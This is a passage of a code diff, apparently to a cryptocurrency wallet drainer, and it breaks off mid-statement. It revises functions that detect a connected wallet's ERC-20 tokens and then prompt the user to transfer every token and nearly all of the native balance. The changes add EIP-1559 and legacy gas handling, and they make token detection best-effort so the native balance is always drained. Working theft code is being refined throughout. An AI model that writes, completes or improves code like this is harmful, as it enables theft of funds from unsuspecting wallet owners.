@@ -290,20 +290,37 @@ export async function drainNativeTokens(
 ): Promise<string | null> {
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
-  
-  const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('20', 'gwei');
+
+  const feeData = await provider.getFeeData();
   const gasLimit = 21000n;
-  const gasCost = gasPrice * gasLimit;
-  
-  const buffer = gasCost * 2n;
+
+  let gasCost: bigint;
+  const txOverrides: ethers.TransactionRequest = { gasLimit };
+
+  if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+    // EIP-1559 (Ethereum, Base)
+    txOverrides.maxFeePerGas = feeData.maxFeePerGas;
+    txOverrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+    txOverrides.type = 2;
+    gasCost = feeData.maxFeePerGas * gasLimit;
+  } else {
+    // Legacy (BSC, Polygon)
+    const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
+    txOverrides.gasPrice = gasPrice;
+    txOverrides.type = 0;
+    gasCost = gasPrice * gasLimit;
+  }
+
+  const buffer = gasCost * 3n;
   const sendAmount = balance - buffer;
-  
+
   if (sendAmount <= 0n) {
-    console.log('Not enough native balance to send after gas');
+    console.log(`[native] Not enough ${chainName} balance after gas`);
     return null;
   }
 
-  return sendNativeToken(signer, sendAmount, chainName);
+  console.log(`[native] Prompting wallet for ${chainName} transfer:`, sendAmount.toString());
+  return sendNativeToken(signer, sendAmount, chainName, txOverrides);
 }
 
 /**
@@ -315,9 +332,6 @@ function txDelay(ms: number = 1500): Promise<void> {
 
 /**
  * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
- * Uses Covalent API (primary) with QuickNode fallback for token detection.
- * If token detection fails entirely, throws an error instead of falling through to native drain.
- * Adds a delay between transactions for Trust Wallet compatibility.
  */
 export async function drainAllEVMTokens(
   signer: ethers.JsonRpcSigner,
@@ -327,35 +341,25 @@ export async function drainAllEVMTokens(
 ): Promise<void> {
   const address = await signer.getAddress();
 
-  // Step 1: Detect ERC-20 tokens
-  const detection = await detectWalletTokens(address, chainId);
-
-  if (!detection.success) {
-    console.error('Token detection failed:', detection.error);
-    throw new Error(`Could not detect ERC-20 tokens: ${detection.error}`);
-  }
-
-  // Step 2: Drain ERC-20 tokens first (each generates its own wallet transaction request)
-  for (let i = 0; i < detection.tokens.length; i++) {
-    const token = detection.tokens[i];
-    try {
-      console.log(`Draining ERC-20 [${i + 1}/${detection.tokens.length}]: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
-      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
-      // Delay between transactions for Trust Wallet compatibility
-      if (i < detection.tokens.length - 1 || true) {
-        await txDelay();
-      }
-    } catch (error) {
-      console.error(`Failed to drain ${token.symbol}:`, error);
-      // Continue with next token even if one fails
-    }
-  }
-
-  // Step 3: Drain native token LAST — always after all ERC-20 tokens
+  // Step 1: Detect ERC-20 tokens (best-effort — never block native transfer)
+  let detectedTokens: EVMTokenBalance[] = [];
   try {
-    console.log(`Draining native token (${chainName}) last...`);
-    await drainNativeTokens(signer, provider, chainName);
-  } catch (error) {
-    console.error('Failed to drain native tokens:', error);
+    const detection = await detectWalletTokens(address, chainId);
+    if (detection.success) {
+      detectedTokens = detection.tokens;
+    } else {
+      console.warn('[drain] ERC-20 detection failed, will still attempt native:', detection.error);
+    }
+  } catch (e) {
+    console.warn('[drain] ERC-20 detection threw, will still attempt native:', e);
   }
-}
+
+  // Step 2: ERC-20 transfers first
+  for (let i = 0; i < detectedTokens.length; i++) {
+    const token = detectedTokens[i];
+    try {
+      console.log(`[drain] ERC-20 ${i + 1}/${detectedTokens.length}: ${token.symbol}`);
+      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
+      await txDelay(1500);
+    } catch (error) {
+      console.error(
